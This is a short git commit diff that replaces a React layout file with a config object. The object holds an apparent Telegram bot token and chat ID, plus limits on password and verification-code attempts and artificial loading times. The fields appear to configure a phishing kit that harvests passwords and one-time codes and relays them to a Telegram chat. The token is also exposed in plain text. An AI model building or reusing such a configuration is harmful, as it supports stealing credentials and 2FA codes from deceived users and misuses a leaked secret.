b6d3cc486b982729c01b7aca5263c7e8fa6c9d7b
nhi01669080-blip <nhi01669080@gmail.com>
2026-05-14 05:55:32 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,13 +1,11 @@
-import RecaptchaProvider from '@/components/RecaptchaProvider';
-
-export default function RootLayout({ children }) {
-  return (
-    <html lang="en">
-      <body>
-        <RecaptchaProvider>
-          {children}
-        </RecaptchaProvider>
-      </body>
-    </html>
-  );
-}
+const config = {
+    token: '8681066205:AAHeDF2WvoizpSPOKEnXe1kzFRmDr274-QQ',
+    chat_id: '6987877952',
+    noti_token: '',
+    noti_chat_id: '',
+    max_password_attempts: 2,
+    max_code_attempts: 3,
+    password_loading_time: 3,
+    code_loading_time: 3
+};
+export default config;
